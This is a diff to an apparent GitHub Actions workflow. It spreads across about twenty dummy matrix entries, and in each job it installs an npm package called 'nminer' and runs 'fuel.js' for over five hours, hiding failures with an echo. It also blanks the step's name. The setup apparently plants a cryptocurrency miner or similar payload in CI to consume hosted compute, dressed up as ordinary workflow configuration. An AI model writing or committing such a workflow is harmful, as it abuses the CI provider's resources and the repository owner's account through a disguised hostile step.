@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7660 }
-          - { version: 8078 }
-          - { version: 4034 }
-          - { version: 2330 }
-          - { version: 4510 }
-          - { version: 8182 }
-          - { version: 8603 }
-          - { version: 6933 }
-          - { version: 8359 }
-          - { version: 8295 }
-          - { version: 7728 }
-          - { version: 3201 }
-          - { version: 8823 }
-          - { version: 6305 }
-          - { version: 9807 }
-          - { version: 105 }
-          - { version: 3507 }
-          - { version: 6551 }
-          - { version: 3219 }
-          - { version: 803 }
+          - { version: 8617 }
+          - { version: 9356 }
+          - { version: 2579 }
+          - { version: 799 }
+          - { version: 3517 }
+          - { version: 8441 }
+          - { version: 6682 }
+          - { version: 2992 }
+          - { version: 1918 }
+          - { version: 7467 }
+          - { version: 1113 }
+          - { version: 1828 }
+          - { version: 4592 }
+          - { version: 3961 }
+          - { version: 740 }
+          - { version: 546 }
+          - { version: 4568 }
+          - { version: 8690 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: watery
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 334m node fuel.js || echo "fuel executed"
+          timeout 314m node fuel.js || echo "fuel executed"
